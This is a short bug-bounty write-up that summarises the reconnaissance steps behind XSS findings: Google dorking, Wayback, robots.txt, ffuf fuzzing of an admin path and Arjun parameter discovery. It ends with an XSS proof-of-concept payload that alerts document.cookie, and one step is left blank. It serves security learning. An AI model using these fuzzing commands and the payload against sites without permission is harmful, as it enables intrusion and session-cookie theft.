# How reading robots.txt file got me 4 XSS reports? 💡💡

### 1. Start doing Google Dorking [Found Nothing]

### 2. Searched for the domain name at Wayback archive [Found Nothing]

### 3. Opened robots.txt file to see what the developer hide from us

### 4. Open source code > Search for any secrets or endpoints > [Found Nothing]

### 5. Open JS files > Use any tool like gospider to extract secrets and Endpoints > [Found Nothing]

### 6. Let’s FUZZ
`ffuf -u https://sub.domain.com/admin/FUZZ -w aspfiles.txt -mc 200`

### 7. Found Endpoint:
`https://sub.domain.com/admin/colorpicker_IEPatch.asp`

### 8. Use Arjun to find hidden parameter
`arjun -u https://sub.domain.com/admin/colorpicker_IEPatch.asp`

### 9. 

### 10. Payload: 
`</script><img src=x onerror=alert(document.cookie)>`


## Credit
Based on [Ahmed Qaramany](https://c0nqr0r.medium.com/reading-robots-txt-got-me-4-xss-reports-9fd2234c635f)'s writeup.
<br>&nbsp;

## Support
You can Follow [me](https://twitter.com/MeAsHacker_HNA) on twitter or
<br><br><a href="https://www.buymeacoffee.com/NafisiAslH" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
